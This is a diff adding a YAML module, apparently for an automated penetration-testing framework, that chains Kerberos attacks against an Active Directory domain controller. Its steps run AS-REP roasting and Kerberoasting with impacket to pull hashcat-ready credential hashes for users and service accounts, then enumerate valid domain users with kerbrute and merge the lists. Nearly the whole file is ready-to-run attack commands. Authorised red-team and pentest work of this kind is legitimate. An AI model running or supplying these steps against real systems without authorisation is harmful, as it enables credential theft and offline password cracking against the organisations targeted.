@@ -1,0 +1,154 @@
+# =============================================================================
+# Module Workflow: Kerberos Attacks
+# =============================================================================
+
+kind: module
+name: ad-kerberos
+description: Kerberos attack primitives — AS-REP roasting, Kerberoasting, user enumeration
+tags: ad, windows, kerberos, active-directory, as-rep, kerberoast
+
+# -----------------------------------------------------------------------------
+# PARAMS SECTION
+# -----------------------------------------------------------------------------
+params:
+  - name: targetIp
+    default: "{{Target}}"
+
+  - name: domainName
+    default: ""
+
+  - name: dcIp
+    default: "{{targetIp}}"
+
+  - name: userList
+    default: "{{Output}}/ad/enum/ad-users-{{TargetSpace}}.txt"
+
+  - name: kerbruteUserList
+    default: "{{ExternalWordlists}}/ad-usernames.txt"
+
+  - name: outputDir
+    default: "{{Output}}/ad/kerberos"
+
+  - name: asrepUsers
+    default: "{{Output}}/ad/kerberos/asrep-users-{{TargetSpace}}.txt"
+  - name: asrepHashes
+    default: "{{Output}}/ad/kerberos/asrep-hashes-{{TargetSpace}}.txt"
+  - name: kerberoastAccounts
+    default: "{{Output}}/ad/kerberos/kerberoast-accounts-{{TargetSpace}}.txt"
+  - name: kerberoastHashes
+    default: "{{Output}}/ad/kerberos/kerberoast-hashes-{{TargetSpace}}.txt"
+  - name: kerbruteResults
+    default: "{{Output}}/ad/kerberos/kerbrute-users-{{TargetSpace}}.txt"
+  - name: domainUsers
+    default: "{{Output}}/ad/kerberos/valid-users-{{TargetSpace}}.txt"
+
+  - name: kerberosTimeout
+    default: "30m"
+
+# -----------------------------------------------------------------------------
+# DEPENDENCIES SECTION
+# -----------------------------------------------------------------------------
+dependencies:
+  commands:
+    - impacket-GetNPUsers
+    - impacket-GetUserSPNs
+    - kerbrute
+
+  variables:
+    - name: Target
+      type: string
+      required: true
+
+# -----------------------------------------------------------------------------
+# REPORTS SECTION
+# -----------------------------------------------------------------------------
+reports:
+  - name: asrep-roastable-users
+    path: "{{asrepUsers}}"
+    type: text
+    description: Users with Kerberos pre-auth disabled (AS-REP roastable)
+
+  - name: kerberoastable-accounts
+    path: "{{kerberoastAccounts}}"
+    type: text
+    description: Service accounts with SPNs (Kerberoastable)
+
+  - name: kerbrute-valid-users
+    path: "{{domainUsers}}"
+    type: text
+    description: Valid domain users via Kerberos enumeration
+
+# -----------------------------------------------------------------------------
+# STEPS SECTION
+# -----------------------------------------------------------------------------
+steps:
+  # ---------------------------------------------------------------------------
+  # Setup: Create output folders
+  # ---------------------------------------------------------------------------
+  - name: create-output-folders
+    type: function
+    log: "Creating Kerberos output folders"
+    functions:
+      - 'create_folder("{{Output}}/ad/kerberos")'
+
+  # ---------------------------------------------------------------------------
+  # AS-REP Roasting with impacket
+  # ---------------------------------------------------------------------------
+  - name: asrep-roast
+    type: bash
+    log: "Running AS-REP roasting to find users without Kerberos pre-auth"
+    pre_condition: '!is_empty("{{domainName}}")'
+    commands:
+      - 'impacket-GetNPUsers -dc-ip {{dcIp}} -request -format hashcat "{{domainName}}/" -no-pass > {{asrepHashes}} 2>/dev/null'
+      - 'grep -i "user:" {{asrepHashes}} | awk "{print \$2}" | tr -d "\\\\\\!" | sort -u > {{asrepUsers}} 2>/dev/null || true'
+    on_error:
+      - action: continue
+
+  # ---------------------------------------------------------------------------
+  # Kerberoasting with impacket
+  # ---------------------------------------------------------------------------
+  - name: kerberoast
+    type: bash
+    log: "Running Kerberoasting to extract service account hashes"
+    pre_condition: '!is_empty("{{domainName}}")'
+    commands:
+      - 'impacket-GetUserSPNs -dc-ip {{dcIp}} -request -outputfile {{kerberoastHashes}} "{{domainName}}/" -no-pass > {{kerberoastAccounts}} 2>/dev/null'
+      - 'grep -i "service" {{kerberoastAccounts}} | sort -u > {{Output}}/ad/kerberos/spn-list-{{TargetSpace}}.txt 2>/dev/null || true'
+    on_error:
+      - action: continue
+
+  # ---------------------------------------------------------------------------
+  # Kerbrute user enumeration
+  # ---------------------------------------------------------------------------
+  - name: kerbrute-user-enum
+    type: bash
+    log: "Enumerating valid domain users via Kerberos"
+    pre_condition: '!is_empty("{{domainName}}")'
+    commands:
+      - 'timeout -k 1m {{kerberosTimeout}} kerbrute userenum -d {{domainName}} --dc {{dcIp}} -o {{kerbruteResults}} {{kerbruteUserList}} > /dev/null 2>&1 || true'
+    on_error:
+      - action: continue
+
+  # ---------------------------------------------------------------------------
+  # Merge valid user lists
+  # ---------------------------------------------------------------------------
+  - name: merge-valid-users
+    type: function
+    log: "Merging valid user lists"
+    functions:
+      - 'exec_cmd("cat {{asrepUsers}} {{Output}}/ad/kerberos/spn-list-{{TargetSpace}}.txt 2>/dev/null | sort -u > {{domainUsers}}")'
+      - 'exec_cmd("cat {{kerbruteResults}} 2>/dev/null | grep -i \"VALID\" | awk \"{print \$NF}\" | sort -u >> {{domainUsers}} || true")'
+      - 'sort_unix("{{domainUsers}}")'
+    on_error:
+      - action: continue
+
+  # ---------------------------------------------------------------------------
+  # Summary
+  # ---------------------------------------------------------------------------
+  - name: summarize-kerberos
+    type: function
+    log: "Summarizing Kerberos findings"
+    functions:
+      - 'log_info("AS-REP roastable users: " + file_length("{{asrepUsers}}"))'
+      - 'log_info("Kerberoastable accounts: " + file_length("{{kerberoastAccounts}}"))'
+      - 'log_info("Valid domain users: " + file_length("{{domainUsers}}"))'
